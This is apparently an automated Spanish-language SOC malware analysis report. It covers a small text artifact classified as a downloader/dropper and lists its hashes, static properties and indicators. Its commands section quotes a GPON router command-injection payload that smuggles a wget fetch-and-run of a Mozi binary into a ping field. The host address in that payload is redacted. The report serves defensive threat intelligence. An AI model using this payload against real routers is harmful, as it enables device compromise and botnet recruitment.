# 🧬 Payload Analysis

`5e997945f2696e835550c258d4ba67d6fdfc6daedd6af6f8f2bb05810c9b421a`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:44:03+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5e997945f2696e835550c258d4ba67d6fdfc6daedd6af6f8f2bb05810c9b421a`
- **SHA1:** `09e7f84f2e83670b37faf1aae679171685255c3f`
- **MD5:** `2bab4a5bb0df0b0e6f7607f3acb63aa2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 135 B |
| Entropía | 5.02 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=3

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+->/tmp/gpon80;sh+/t
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+- | strings |
| hash | 5e997945f2696e835550c258d4ba67d6fdfc6daedd6af6f8f2bb05810c9b421a | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+->/tmp/gpon80;sh+/t | strings |
| ip | 36.255.33.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
